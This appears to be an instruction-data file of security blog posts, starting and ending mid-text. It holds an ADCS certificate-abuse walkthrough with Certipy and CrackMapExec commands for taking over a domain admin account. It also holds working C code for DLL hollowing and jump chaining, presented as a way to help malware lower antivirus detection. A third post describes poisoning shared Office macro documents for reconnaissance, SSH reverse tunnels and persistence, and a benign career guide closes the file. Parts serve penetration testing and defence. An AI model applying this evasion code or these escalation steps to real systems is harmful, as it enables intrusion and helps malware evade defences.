file to start dnsmasq at the appropriate time by copying the code below into the file /lib/systemd/system/StartDNSMASQ.service and saving it using the following command:\n\nsudo nano /lib/systemd/system/StartDNSMASQ.service\n\n[Unit]\nDescription=Start DNSMasq\nAfter=network-online.target\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c \"/opt/dnsmasq.sh\"\n\n[Install]\nWantedBy=multi-user.target\n\nNext, enable the newly created service using the following command:\n\nsudo systemctl enable StartDNSMASQ.service\n\nNow, reboot your implant.\n\nDrumroll\u2026.\n\nOnce your implant reboots, in a couple of minutes your host computer should register a new Ethernet device, which, in my case, is Ethernet 4 and is designated as a Remote NDIS Compatible Device. It should get the IP address 192.168.255.3 if everything worked as expected.\n\nNote: You may get a warning like this one below. I have not taken the time to figure out how to avoid this so, yeah. Sorry. It's expected at this point.\n\nWhew, if you made it this far, I am happy to tell you the hard part is over! Congratulations.\n\nIn part four of this blog series, we will pick up from here and finish integrating LoRa out of band communication to create the ultimate physical implant.\n\nStay tuned.\n\nREAD:\n\nPART ONE\n\nPART TWO\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Abusing Active Directory Certificate Services (Part 4)\"\nTaxonomies: \"Alyssa Snow, Blue Team, External/Internal, General InfoSec Tips & Tricks, How-To, Informational, Red Team\"\nCreation Date: \"Thu, 30 May 2024 15:31:17 +0000\"\n\nStart this blog series from the beginning here: PART 1\n\nMisconfigurations in Active Directory Certificate Services (ADCS) can introduce critical vulnerabilities into an Enterprise environment. In this article, we will cover the basics of exploiting escalation techniques ESC2 and ESC3 using Certipy.1 These escalation techniques abuse overly permissive enrollment rights and Extended Key Usage configurations. The Extended Key Usage (EKU) policies define how a certificate can be used. Some examples of the available descriptors for the EKU policy are shown in the following screenshot.\n\nEKU Descriptor Examples \n\nUsers authorized to request a certificate can be defined on the Certificate Authority itself and in the certificate template object. The CA properties can be viewed via the certsrv utility, Right Click CA > Properties > Security.\n\nCA CSR Descriptor \n\nThe template permissions for the \"User\" template are displayed in the Certificate Template Console, as shown below.\n\nTemplate Security Permissions \n\nESC2 \n\nA certificate template vulnerable to ESC2 is configured with the Any Purpose EKU or without an EKU configuration.  \n\nA template that specifies the Any Purpose EKU can allow an attacker to create a certificate with any purpose such as Code Signing, Client authentication, etc. Such a certificate can be used to authenticate to Active Directory as the user who originally requested the certificate and can be used to sign other certificates. \n\nTemplates vulnerable to ESC2 have the following conditions: \n\nLow Privilege Users Granted Enrollment Rights \n\nSignatures Required: 0 \n\nEnabled: True \n\nRequires Management Approval: False \n\nAny Purpose: True OR Extended Key Usage: False \n\nExample: \n\nIn the following example, let's imagine that we have gained a foothold in our target company, FOOBAR's, internal network, and we\u2019ve compromised the account of a user with the name bspears.  \n\nFirst, let's try to request a certificate on behalf of the domain admin using an existing template. Using the Certipy command below, we will request a certificate using the default \"User\" template on behalf of the domain admin with the username administrator.  \n\nThe Certipy arguments required to request the certificate are as follows: \n\nu - username \n\np - user's password \n\ndc-ip - domain controller IP address \n\ntarget - target CA (Certificate Authority) DNS (Domain Name System) Name  \n\nca - short CA Name  \n\ntemplate - template name \n\non-behalf-of - specifies another entity to request a certificate for \n\ncertipy-ad req -u 'bspears' -p 'REDACTED' -dc-ip '10.10.0.10' \\ \n-target 'dc01.foobar.com' \n-ca 'foobar-CA' \\ \n-template 'User' \\ \n-on-behalf-of 'example\\administrator' \n\nAs shown in the figure below, this request resulted in an error and indicated that a PFX is required. Currently, we do not have a PFX that can be used to request a certificate on behalf of another user.  \n\nHowever, if bspears can request a certificate using a template configured with an EKU of Any Purpose, we can use the resulting PFX to request another certificate on behalf of another domain account. \n\nFailed to Obtain New Certificate for Administrator \n\nTo find a certificate vulnerable to ESC2, we can enumerate ADCS configurations with Certipy. By specifying the -enabled and -vulnerable flags, we can tell Certipy to specifically print out vulnerable templates that are enabled. \n\ncertipy find -u 'bspears' -p REDACTED -dc-ip 10.10.0.10 -vulnerable -enabled \n\nAll conditions for ESC2 are met by the \"ESC2_User\" template. \n\nESC2_User Template \n\nOur compromised user account bspears is a part of the Domain Users group and therefore is authorized to request a certificate using the vulnerable template. Using the command below, we can request a certificate for bspears. \n\ncertipy-ad req -u 'bspears' -p 'REDACTED' \\ \n-dc-ip '10.10.0.10' \\ \n-target 'dc01.foobar.com' \\ \n-ca 'foobar-CA' \\ \n-template 'ESC2_User'-debug \n\nThe Certipy results will return the request ID or an Object SID. Note these.  \n\nSee the \"Validity Period\" section for more information. \n\nRequest Certificate for bspears \n\nThe certificate generated from the request above can now be used to sign new certificates. To request a certificate on behalf of the domain admin, we will use the -pfx flag and specify the \"bspears.pfx\" file. \n\ncertipy-ad req -u 'bspears' -p 'REDACTED' -dc-ip '10.10.0.10' \\ \n-target 'dc01.foobar.com' \n-ca 'foobar-CA' \\ \n-template 'User' \\ \n-on-behalf-of 'example\\administrator' \\ \n-pfx bspears.pfx -debug \n\nTake note of the returned request ID or an Object SID \n\nRequest Certificate for Domain Administrator \"administrator\" \n\nWe now have our certificate for the administrator account, we can authenticate as the domain admin.  \n\nIn summary, due to an overly permissive certificate template configuration, we were able to obtain a certificate on behalf of a low-privilege user, which we could then use to request a certificate on behalf of a Domain Administrator account.  \n\nESC3\n\nThe Certificate Request Agent EKU can be used to request a certificate on behalf of another domain object. Templates vulnerable to ESC3 are configured with this EKU and allow low-privilege users to enroll. The ESC3 template requirements are as follows: \n\nLow-Privilege Users Granted Enrollment Rights \n\nSignatures Required: 0 \n\nEnabled: True \n\nRequires Management Approval: False \n\nCertificate Request Agent EKU \n\nExample 1: \n\nContinuing with our FOOBAR scenario. Let's review the Certipy output for ESC3 conditions. As shown in the figure below, all conditions for ESC3 are met by the \"ESC3_User_1\" template. \n\nESC3_User_1 Template \n\nOur compromised user account bspears is a part of the Domain Users group and, therefore, is authorized to request a certificate using the vulnerable template. Using the command below, we can request a certificate for bspears. \n\ncertipy-ad req -u 'bspears' -p 'REDACTED' \\ \n-dc-ip '10.10.0.10' \\ \n-target 'dc01.foobar.com' \\ \n-ca 'foobar-CA' \\ \n-template 'ESC3_User_1'-debug \n\nOnce again, the Certipy results will return the request ID or an Object SID. Note these.  \n\nSee the \"Validity Period\" section for more information. \n\nRequest Certificate for bspears \n\nimilar to ESC2, we can now use our certificate generated in the previous step to request a certificate on behalf of another user via the \"User\" template. As demonstrated below, we can use this template to request a certificate on behalf of the domain admin. \n\ncertipy-ad req -u 'bspears' -p 'REDACTED' -dc-ip '10.10.0.10' \\ \n-target 'dc01.foobar.com' \n-ca 'foobar-CA' \\ \n-template 'User' \\ \n-on-behalf-of 'example\\administrator' \\ \n-pfx bspears.pfx -debug \n\nRequest Certificate for Domain Administrator \"administrator\" \n\nWe now have our certificate for the administrator account, we can authenticate as the domain admin.  \n\nExample 2: \n\nWe can also request a certificate using a template that has an Issuance Requirement policy specifying Certificate Request Agent.  \n\nIn the screenshot below, the\"ESC3_User_2\" template was configured with an authorized signature requirement set to 1 and the issuance requirement policy set to Certificate Request Agent.  \n\nESC3 Template 2 \n\nAdditional key configurations for the \"ESC3_User_2\" template are listed below.  \n\nLow Privilege Users Granted Enrollment Rights \n\nEnabled: True \n\nClient Authentication: True \n\nRequires Management Approval: False \n\nAuthorized Signatures Required: 1 \n\nApplication Policies: Certificate Request Agent \n\nThe Certipy results for this template are shown below. \n\nCertipy Results for ESC3_User_2 Template \n\nOnce again, we will request a certificate for bspears using the \"ESC3_User_1\" template. \n\ncertipy-ad req -u 'bspears' -p 'REDACTED' \\ \n-dc-ip '10.10.0.10' \\ \n-target 'dc01.foobar.com' \\ \n-ca 'foobar-CA' \\ \n-template 'ESC3_User_1'-debug \n\nTake note of the returned request ID or an Object SID \n\nRequest Certificate for bspears \n\nThen we can use our certificate generated for bspears to request a certificate on behalf of the administrator account using the \"ESC3_User_2\" template.  \n\ncertipy-ad req -u 'bspears' -p 'REDACTED' \\ \n-dc-ip '10.10.0.10' \\ \n-target 'dc01.foobar.com' \\ \n-ca 'foobar-CA' \\ \n-template 'ESC3_User_2' \\ \n-on-behalf-of 'example\\administrator' \\ \n-pfx bspears.pfx -debug \n\nTake note of the returned request ID or an Object SID \n\nRequest Certificate for Domain Administrator \"administrator\" \n\nOnce again, we have our certificate for the administrator account, we can authenticate as the domain admin.  \n\nSummary \n\nAs you can see, the steps to exploit ESC3 are similar to those in ESC2. Each escalation technique combined overly permissive enrollment rights with Extended Key Usage configurations. However, the conditions of the vulnerable templates for each technique are slightly different. \n\nIn both examples, we were able to obtain a certificate on behalf of a low privilege user, which we could then use to request a certificate on behalf of a high privileged (Domain Admin) account. \n\nCertificate Authentication \n\nOnce we have our certificate \"administrator.pfx\", we can use the certificate to obtain the credential hash and a Kerberos ticket of the target administrator account using the Certipy auth command as shown below: \n\ncertipy auth -pfx administrator.pfx \n\nAs shown in the figure below, we successfully retrieved a TGT and the NT hash for the administrator account.  \n\nGet Administrator Credentials \n\nNow we can impersonate the administrator! To demonstrate this, we can use CrackMapExec2 to authenticate to the domain controller and execute commands as the domain admin. \n\ncrackmapexec smb 10.10.0.10 -u administrator -H REDACTED_HASH' -x whoami \n\nExecute Command Using Administrator Credentials \n\nValidity Period \n\nIt is important to note that certificates are valid until the validity period ends unless the certificate is explicitly revoked. This is why we must pay attention to the request number/SID returned as a result of the certificate request.  \n\nLet\u2019s look at an example template to demonstrate this. As we can see in the figure below, the template specifies a validity period of 5 years. \n\nValidity Period \n\nIf we use the template above to request a certificate on behalf of the user \"DA Dan\", we will have access to DA Dan\u2019s account for the next five years, regardless of any password changes. We can also renew the certificate before the expiration date to maintain access to the account \u2014 which means that this technique not only is a handy privilege escalation technique but could also serve as a means of persistence. \n\nPrevention and Detection \n\nSo, what can you do to prevent and detect such attacks? Here are a few steps you can take: \n\nMake sure that template permissions are as restrictive as possible. Only grant necessary groups/users enrollment permissions. \n\nReview all CAs in your environment and remove \"Request Certificates\" permissions (Enrollment Rights) from all unnecessary groups. This will prevent unnecessary, low-privilege groups from enrolling via certificate templates. \n\nTake stock of your certificate templates and determine whether all enabled templates are currently in use. Disable all templates that are unnecessary. \n\nRestrict forms of certificate authentication allowed in your environment.  \n\nMonitoring \n\nMonitoring certificate enrollment events for users can allow you to detect when an account requests a certificate and when your CA issues a certificate. By monitoring these events, an administrator can alert on anomalous behavior and revoke certificates that appear to be malicious or suspicious. Some useful event IDs can be found below: \n\n4886 \u2013 Request for certificate \n\n4887 \u2013 Certificate issued \n\n4768 \u2013 Request for Kerberos ticket (TGT) \n\nResources\n\nSpecterOps Whitepaper:\u202fhttps://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf \n\nSpecterOps Blog Post:\u202fhttps://posts.specterops.io/certified-pre-owned-d95910965cd2 \n\nMicrosoft PKI defensive guidance: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786443(v=ws.11) \n\nPKIAudit:\u202fhttps://github.com/GhostPack/PSPKIAudit \n\nPKINITtools: https://github.com/dirkjanm/PKINITtools \n\nPyWhisker: https://github.com/ShutdownRepo/pywhisker \n\nCerti: https://github.com/zer1t0/certi \n\nImpacket: https://github.com/fortra/Impacket \n\nCertipy: https://github.com/ly4k/Certipy \n\nCertify: https://github.com/GhostPack/Certify \n\nFootnotes\n\nREAD:\n\nPART 1\n\nPART 2\n\nPART 3\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"DLL Jmping: Old Hollow Trampolines in Windows DLL Land\"\nTaxonomies: \"Debjeet Banerjee, General InfoSec Tips & Tricks, Informational, InfoSec 201, Red Team, Red Team Tools\"\nCreation Date: \"Thu, 06 Jun 2024 14:45:37 +0000\"\n\nDLL hollowing is an age-old technique used by malware authors to have a memory-backed shellcode. However, defensive mechanisms like CFG and XFG have made it incredibly difficult to implement such techniques. Controls like WDAC are enabled by default on the latest Windows releases, which adds an extra layer of difficulty when it comes to implementing alternate versions of this technique.\n\nHowever, Windows still has some DLLs on the system which can be leveraged for DLL Hollowing or, coupled with some JOP, can be used to spoof the origin of threads from tools like Process Hacker. This blog demonstrates how we can dynamically locate such DLLs and use them to deliver payloads. The technique discussed in this blog can help malware authors to dynamically find such DLLs on a target system and use them to masquerade the origin of threads, as well as have memory-backed shellcode to bring down detection rate of payloads.\n\nFinding Target DLLs\n\nTo find a list of DLLs, we need a couple of functions:\n\nA function that iterates through the system directory recursively to find all DLLs present.\n\nA function that checks if the DLLs can be used to stage payload delivery.\n\nThe first part is fairly simple. We use a function to recursively search a directory for all DLLs as such:\n\nBOOL ListDLLsInDirectory(LPCTSTR directoryPath) {\n HANDLE hFind;\n WIN32_FIND_DATA findFileData;\n TCHAR searchPath[MAX_PATH];\n\n if (NULL == directoryPath) return FALSE;\n \n // Combine directory path with wildcard search pattern\n if (S_OK != StringCchPrintf(searchPath, MAX_PATH, TEXT(\"%s\\\\*\"), directoryPath)) return FALSE;\n \n // Find the first file in the directory\n hFind = FindFirstFile(searchPath, &findFileData);\n if (hFind == INVALID_HANDLE_VALUE) return FALSE;\n\n // List all DLL files\n do {\n if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {\n // Skip \".\" and \"..\" directories\n if (_tcscmp(findFileData.cFileName, TEXT(\".\")) != 0 && _tcscmp(findFileData.cFileName, TEXT(\"..\")) != 0) {\n // Recursively list DLLs in subdirectory\n TCHAR subDirPath[MAX_PATH];\n if (S_OK != StringCchPrintf(subDirPath, MAX_PATH, TEXT(\"%s\\\\%s\"), directoryPath, findFileData.cFileName)) {\n FindClose(hFind);\n return FALSE;\n }\n ListDLLsInDirectory(subDirPath);\n }\n }\n else {\n // Print the DLL file name\n if (endsWithDll(findFileData.cFileName)) {\n // Check if DLL is valid\n TCHAR dll_path[MAX_PATH] = { 0 };\n if (S_OK != StringCchPrintf(dll_path, MAX_PATH, TEXT(\"%s\\\\%s\"), directoryPath, findFileData.cFileName)) {\n FindClose(hFind);\n return FALSE;\n }\n\n LPVOID txt_addr = CheckIfDllWorks(dll_path);\n if (txt_addr != NULL) {\n size_t entry_size = sizeof(DLLInfo);\n PDLLInfo entry = (PDLLInfo)malloc(entry_size);\n RtlZeroMemory(entry, entry_size);\n entry->txt_section = txt_addr;\n memcpy(entry->dll_path, dll_path, MAX_PATH);\n\n // Check if this is the first entry \n if (LL_HEAD == NULL) LL_HEAD = entry;\n\n // Set the last entry's next pointer\n if (Current != NULL) Current->next = entry;\n\n Current = entry;\n }\n }\n }\n } while (FindNextFile(hFind, &findFileData));\n\n // Close the search handle\n FindClose(hFind);\n\n return TRUE;\n}\n\nWe can then call the above function like such:\n\nTCHAR systemDirectory[MAX_PATH];\nGetSystemDirectory(systemDirectory, MAX_PATH);\nListDLLsInDirectory(systemDirectory);\n\nThe function uses recursion to locate all DLLs in the systems folder, aka `C:\\Windows\\System32`. Once we locate a DLL file, we use the `CheckIfDllWorks` function to verify if the DLL can be used to deliver payloads (more on this a bit later).\n\nIf the DLL can be used for payload delivery, then we add it to a linked list that contains the DLLs to use and the address at the beginning of their `.text` section. Looking into the `CheckIfDllWorks()` function, it has the following code:\n\nLPVOID CheckIfDllWorks(TCHAR* dll_path) {\n if (IsDllLoaded(dll_path)) return NULL;\n\n HMODULE hModule = LoadLibraryEx(dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);\n if (hModule == NULL) return NULL;\n \n IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;\n IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((DWORD_PTR)hModule + dosHeader->e_lfanew);\n\n // Check for CFG \n if (ntHeaders->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_GUARD_CF) {\n FreeLibrary(hModule);\n return NULL;\n }\n\n // Iterate through the section headers\n IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);\n for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++) {\n ULONG _txt_offset = 0;\n\t\tif (strncmp((char*)sectionHeader->Name, \".text\", 5) == 0) {\n\t\t\t_txt_offset = sectionHeader->VirtualAddress;\n\t\t\tLPVOID txt_section = (LPVOID)((UINT64)hModule + _txt_offset);\n\t\t\treturn txt_section;\n\t\t}\n }\n FreeLibrary(hModule);\n return NULL;\n}\n\nThe function checks three things:\n\nIs the DLL already loaded in memory? If not, it moves to the next check\n\nWas the DLL compiled with CFG enabled? If not, it moves to the final check\n\nDoes the DLL have a `.text` section where we can host our code? If so, the function computes the offset of the `.text` section and adds it to the base address to get the location of the `.text` section loaded in memory\n\nOne interesting artifact I would like to mention is that we use the `LoadLibraryEx()` function over the `LoadLibrary()` function, as that enables us to load a DLL in memory without the need to call `DllMain()`\n\nUltimately, we have a linked list full of DLLs loaded in the process memory which we can use to redirect execution to our shellcode.\n\nJmp'ing to Shellcode\n\nNow for the payload propagation part, we would write the following instruction at the start of every `.text` section:\n\nmov rax ; 48 b8 \ncall rax ; ff d0\n\nThe code for the process looks as such:\n\nBOOL AddJmp(LPVOID jmp_tgt, LPVOID src) {\n size_t inst_size = 12 * sizeof(unsigned char);\n unsigned char* inst = (unsigned char*)malloc(inst_size);\n if (inst == NULL) return FALSE;\n\n RtlZeroMemory(inst, 12 * sizeof(unsigned char));\n inst[0] = 0x48;\n inst[1] = 0xb8;\n inst[10] = 0xff;\n inst[11] = 0xd0;\n int i = 2;\n uintptr_t bytes = (uintptr_t)(jmp_tgt);\n while (i < 10) {\n inst[i] = bytes & 0xFF;\n bytes = bytes >> 8;\n i++;\n }\n AllocatePayload(src, inst, inst_size);\n return TRUE;\n}\n\nLPVOID BackDoorDLL(LPVOID p_addr) {\n PDLLInfo entry = LL_HEAD;\n LPVOID tgt_addr = p_addr;\n\n while (entry != NULL) {\n if (!AddJmp(tgt_addr, entry->txt_section)) return NULL;\n tgt_addr = entry->txt_section;\n entry = entry->next;\n }\n return tgt_addr;\n}\n\nThe `BackDoorDLL()` function takes in the address of the shellcode. We then iterate through the Linked List and use the `AddJmp()`  to write the opcode for the instruction to the start of the `.text` section of the DLLs. Finally, the `BackDoorDLL()` function returns the address of the start of the chain, which we can then pass onto functions like `CreateThread()` which will eventually lead to the execution of shellcode.\n\nAlternatively, if the size of the payload is less than the size of a particular DLL's `VirtualSize`, we can use the DLL to even overwrite the DLL memory with the shellcode.\n\nTesting the Code\n\nCompiling and running the project, we should see our _Hello World_ MessageBox payload being executed.\n\nLooking at the thread in Process Hacker, we see that the origin for the thread is being reflected as `pspluginwkr.dll` instead of the binary.\n\nFurther putting a breakpoint at one of the intermediate addresses confirms that the chain calls are taking place and that it works as expected.\n\nVirusTotal Comparisons\n\nTo check the effectiveness of this method, we upload two sets of payloads:\n\n- One with a direct call to the Shellcode\n\n- One using the above method\n\nThe samples used the same unencrypted payload, without any other evasions, and were compiled using the same flags as well.\n\nThe sample which directly called the payload returned the following detection rate:\n\nHowever, implementing the above method discussed method seems to significantly reduce the detection rates to:\n\nTherefore, it would be worthwhile to include the method in this blog post in your Offsec tooling.\n\nCombined with other evasion techniques, the chaining method discussed here can help Offsec Devs create more undetectable payloads. Happy Hacking!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Augmenting Security Testing and Analysis Activities with Microsoft 365 Products\"\nTaxonomies: \"David Fletcher, Informational, Red Team, macros, Microsoft 365\"\nCreation Date: \"Thu, 13 Jun 2024 15:00:00 +0000\"\n\nUse of Microsoft 365 products in security testing is not a new concept. For a long time, I've incorporated various activities using Office products into my testing regimen. In the early days, we used to frequently use malicious Office documents for initial access, embedding malware in a macro-laden document to be executed when the user opened the file.\n\nSadly, direct payload execution using VBA macro logic has become increasingly more difficult and organizations may block inbound macros altogether. All is not lost though, there's plenty of opportunity to use macros during testing (and for analysis as a defender). Over time, my macro use has evolved from direct execution to focusing on other capabilities that might be useful in the context of security testing. I will cover some of those concepts in this blog post. For expanded treatment on the subject, watch my webcast on the same subject at https://www.youtube.com/watch?v=cfKDnxeoTuQ.\n\nResources discussed in this blog post can be found at https://github.com/aut0m8r/FunWithMacros.\n\nMicrosoft Office Product Choices\n\nMicrosoft Office products are just another LOLbin at our disposal. In incorporating Microsoft Office products into your testing methodology, it might be useful to consider which product to start with. In my case, I most frequently tend to use Microsoft Excel for the following reasons:\n\nData is presented in a simple tabular format \u2013 this makes it easy to analyze, visualize, and present information in bulk. Rather than having to investigate each object in Bloodhound to see the value of a given attribute, I can just look at the table itself and use integrated features.\n\nHiding (and unhiding) elements \u2013 Columns and tables can be hidden in Microsoft Excel workbooks. This provides the opportunity to collect information into elements that are not immediately accessible to the user. This is extremely valuable when poisoning existing macro-enabled documents.\n\nIntegrated features \u2013 Sorting, filtering, conditional formatting and formula support make Excel an attractive product for collection of raw data that may require manipulation and analysis after the fact.\n\nExternal data collection \u2013 Excel supports a ton of features for collecting information from the local environment, LDAP (Active Directory), databases, and other sources that might be useful in the context of testing and security analysis. Often, collection of data using these features goes undetected within an environment.\n\nAt the end of the day, I recommend using the product that makes the most sense in the context of your given conditions. You may need to adapt the strategies identified here, but in doing so, you're likely to be expanding the tooling options available to the greater community.\n\nWith the advent of Microsoft 365, the Office suite has added some additional features that might help us in our testing efforts along the way. Consider the scenario where you gain access to an organization's Microsoft 365 environment, but don't establish remote C2. Commonly, this typically occurs when using a reverse proxy, pilfering the browser credential store, or just analyzing stealer malware dumps.\n\nOffice products now include the notion of presence: when a user opens a document, a presence indicator appears in the ribbon for any other user that has the same document open. As a consequence, one of my favorite activities is to search for existing macro-enabled documents that appear to be frequently used in SharePoint, OneDrive, or SMB shares and wait for the presence information to appear.\n\nAfter I'm convinced that the documents are going to be useful for my nefarious purposes, I add my own macro logic to the existing document. The wonderful thing about this technique is that we don't have to really worry about the \"enable macros\" prompt because we know that users are ALREADY using our target document.\n\nObviously, before you go poisoning documents all willy-nilly, you should take some time to understand how your surrogate code will affect the operation of the legitimate document. Also\u2026 ALWAYS make a backup of the original document.\n\nCommon Activities\n\nSo, what can we do this these documents that won't cause endpoint protection to trigger on a given device? I often approach document poisoning in several stages.\n\nReconnaissance\n\nIn the initial stage, my approach is usually guided by the following question. \"What would I want to know prior to sending a phishing email to this user?\" The answer usually includes:\n\nWhat kind of endpoint protection is on my target host? \u2013 We can interrogate processes and investigate the contents of the local filesystem to at least get a rough approximation.\n\nWhat permissions does my target user have in the environment? \u2013 We can definitely ask Active Directory and then target our payload to execute in context of a specific user if we desire.\n\nAre there any useful applications I might want to try to impersonate to avoid detection? \u2013 Usually, this involves investigating the file system for entries that might indicate custom developed applications.\n\nI usually look for the name of my organization in the Program Files folders, then, when I do try to deliver a payload, I mimic characteristics of those applications. Why would I do this? Because these applications are commonly allowlisted in application control and endpoint protection solutions and may be ignored by the security team.\n\nAfter gathering details from the remote system, I might want to perform analysis on Active Directory. Gathering details about the password policy, a list of users, groups, and computers often helps me better understand the target environment and will increase the effectiveness of any external attacks I'm executing.  Password spraying effectiveness will certainly be increased by having a full list of internal users and knowledge of the internal password policy. In addition, Active Directory attribute analysis may expose additional credentials. An excerpt of commonly useful output is shown below.\n\nDomain Password Policy Details\n\nUser Account Details\n\nComputer Details\n\nSensitive Group Membership\n\nInitial Access\n\nWith sufficient knowledge about the internal environment, I might attempt to establish remote command and control (C2) on the target system. An interesting method of doing this involves abuse of the SSH client that is installed on modern Microsoft Windows clients by default. Typically, I'll set up a restricted SSH users on a Virtual Private Server (VPS) instance, and then use SSH to either deliver a payload to the endpoint or establish a reverse SSH tunnel connection. Often, I find that I can establish outbound SSH connectivity using TCP port 443.\n\nMy approach to establishing this access often involves using the macro to do two things. First, I drop the SSH private key for my restricted user (on the VPS) to the compromised user's profile directory. Next, I drop an LNK file to somewhere that will cause user-induced execution. Examples include the startup folder or the users' desktop for hotkey persistence.\n\nThe LNK file contains the SSH command used to do my bidding. This could include downloading and executing a payload, downloading the payload directly to a dll hijack or dll sideload location, or establishing a reverse SSH tunnel. SSH file transfer has the benefit of not receiving Mark of the Web.\n\nPost Compromise\n\nAfter establishing a foothold in the environment, I often use Microsoft Excel for post compromise activities as well. The product has native support for connecting to various resources. Features that I've already implemented include:\n\nAnalysis of the SYSVOL/Policies share \u2013 This feature will gather details about interesting artifacts, like drive mappings, scripts, URLs, and nonstandard policy files. The results can provide a stealthier alternative to full SMB share analysis and scanning for internal web applications.\n\nSQL database access \u2013 This feature identifies computers with Service Principal Names (SPNs) containing MSSQLSvc then attempts to connect to each one, providing a database listing for any accessible database servers.\n\nLAPS password access \u2013 LAPS analysis is tricky because, if the product is not deployed, then the associated attribute (ms-mcs-AdmPwd) may not exist in the directory. This module will check for readable LAPS passwords under the context of the executing user.\n\nThese features are just the tip of the iceberg.  The Data tab in the Microsoft Excel ribbon has a ton of functionality that attackers may be able to use to perform interesting operations. Did you know that you can use Microsoft Excel as a SQL client for various data sources.  You should definitely check it out.\n\nAnother technique I have used in post-compromise situations is to hunt for commonly used macro enabled documents INTERNALLY. Then I reengage with document poisoning, only this time I drop a payload on an internal writeable file share and use an LNK file to execute that payload using the same techniques described above.\n\nConclusion\n\nHopefully this blog post has gotten your creative juices flowing. Microsoft Office is a tool that is just as ripe for abuse as any other. As you're exploring environments, consider how you might use native features to enhance your testing methodology. At the very least, you will provide your customers with food for thought to consider hardening deployments of common tools like the Microsoft Office suite.\n\nOne last note for defenders, consider how gathering information from Active Directory might help you bolster your internal security. If you can't get permission to run tools like BloodHound or PingCastle in your environments, use of the Office suite may be a good starting point for understanding where weaknesses might exist in your environments.\n\nIf you feel like you might want to collect this type of information from Active Directory, please check out the resources available at https://github.com/aut0m8r/FunWithMacros.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"From High School to Cyber NinjaFor Free (Almost)!\"\nTaxonomies: \"Carrie Roberts, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Getting Started In InfoSec, training\"\nCreation Date: \"Thu, 20 Jun 2024 15:00:00 +0000\"\n\n| Carrie Roberts // Guest Author\n\nCarrie Roberts is an Antisyphon instructor and experienced cyber security professional who has mentored many on their journey into cyber.\n\nMy name is Carrie Roberts and I love my job in cyber security because there is so much to be learned and so many ways to contribute in positive and imaginative ways. Not to mention, the pay is great, the skillset is in high demand, and there are flexible work arrangements and schedules. I encourage everyone to consider cyber security as a career, and I am always looking for ways to help them do it. That is why I have created this Cyber Ninja training plan.\n\nI have three high school-age daughters who are interested in becoming cyber engineers, and I have been spending my time developing the best and most cost-effective plan to take them from high school all the way to Cyber Ninja! To my pleasant surprise, I found that the education and hands-on practice to make that happen is already available for free to anyone with a computer and an internet connection. It is only the credentials (certifications and degrees) that cost money. In fact, you could spend a lifetime reviewing all the free content available. But what you need is a guide that will take you through the maze of material in the most logical and efficient manner possible, and that is what I am offering you here. I have not put anything on this list that I have not personally completed to confirm the quality of the content, and I believe that this content will take you well on your way towards becoming a cyber professional.\n\nI originally wanted to have a list of completely free resources but then I discovered TryHackMe training, and it was so amazing and affordable ($15/mo) that I decided to make it part of the plan.\n\nCyber Ninja Training Plan (Free)\n\nTryHackMe Training Plan\n\nThe Cyber Ninja training starts off with some low level \u201chow computers and the internet work\u201d content to get everyone on solid footing. It then takes you through 40 hours of Professor Messer\u2019s excellent training courses to prepare you for the CompTIA A+, Network+, and Security+ certifying exams. You don\u2019t have to pay to take exams, but, if you do, they will give your resume a nice boost. Next, I highly encourage you to try the TryHacKMe hands-on learning. It is free to use to some extent, but you will need the $15/month subscription to complete all of it. You will be well on your way to developing your cyber skills after completing the ~380 hours of training modules within TryHackMe.\n\nOk, back to the Cyber Ninja Training plan, where you get in-depth hands-on training with \u201cBurp Suite Intercepting Proxy,\u201d arguably the most used tool by pentesters. Then, we get into the \u201cNinja\u201d part of the training, where you will learn HTML, Javascript, SQL, Python, PowerShell, Bash and Batch Scripting, Regular Expressions, Git/GitHub, and more!\n\nCompleting the approximately 600 hours of training above may be enough to land you the cyber security job that you want. To increase your chances and your potential for higher income, I recommend obtaining a degree and some industry certifications, but this is expensive! Let\u2019s talk about college hacks to minimize the cost.\n\nFirst, there are great companies that will pay for your degree in full if you work for them at least part-time. This includes Walmart\u2019s Live Better U program, which covers 100% tuition and books; eligibility starts on your first day of part-time or full-time work. My next favorite is Kentucky Fried Chicken\u2019s partnership with Western Governors University, covering 100 percent tuition and fees. Or look here for more corporate-sponsored options.\n\nThese employer-paid programs are all great options. But time is money, and the more time you spend working, the longer school will take you to complete. For this reason, I offer this method for fast-tracking your college degree:\n\nComplete your prerequisites at Sophia Learning (things like math, science, English, writing, etc.)\n\nTransfer your credits to a self-paced college (you know, one where you can work faster than average)\n\nSophia Learning is an online university whose credits transfer to several partner universities. The cost is only $99/month, or you can purchase 1 year of access for $600. That is only $50/month! You can take 2 classes at a time and complete them at any speed you want (like, really fast, for example). The minimum age to enroll is 13 years old and you don\u2019t need to have completed high school first. It is available to anyone worldwide (you don\u2019t have to be a US citizen). It only takes 5 minutes and a credit card to sign up, and no prior transcripts are required. I suspect that even the mildly ambitious student can complete 1 course per month on average, about 44 credits within a year.\n\nNext, let\u2019s assume that you are going to enroll in Western Governors University (US residents only) and pursue one of their cyber-related degrees which are linked to below:\n\nCybersecurity and Information Assurance\n\nCloud Computing\n\nInformation Technology\n\nNetwork Engineering and Security\n\nSoftware Engineering\n\nComputer Science\n\nAll these degrees are great options for helping you be successful in cyber security. Let\u2019s assume you choose the Cybersecurity and Information Assurance degree. The cost per 6 months of access to courses is $4,265. At WGU, there is no homework, only testing (often only one) to confirm that you know the material. This means that if you already know the material, you can start and finish the course within a single day by simply passing the test. Everything is graded pass/fail so there is no GPA to worry about and there are options to retake a failed test if needed. Since you will have already completed your general education requirements through Sophia Learning, and already learned the majority of the course material through 